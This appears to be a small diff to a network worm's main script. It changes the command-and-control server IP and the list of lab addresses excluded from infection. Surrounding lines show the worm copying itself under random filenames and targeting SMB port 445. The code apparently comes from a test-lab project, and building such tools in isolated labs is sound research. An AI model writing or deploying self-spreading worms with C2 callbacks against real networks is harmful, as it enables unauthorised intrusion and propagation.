@@ -22,10 +22,10 @@ def main():
         clone(file_path, str(uuid.uuid4())+file_path)
     
     #uncomplete a c2_server ip address for the worm to reach back
-    c2_server = "192.168.56.108"
+    c2_server = "192.168.56.4"
     
     #in testing enviroment, escape those ip address
-    not_testing_targets = ["192.168.56.1", "192.168.56.100", "192.168.56.108"]
+    not_testing_targets = ["192.168.56.1", "192.168.56.2", "192.168.56.4"]
     
     #pre-definded ports that the program have the tools to exploits
     vulnerable_target_ports = ['445',] 
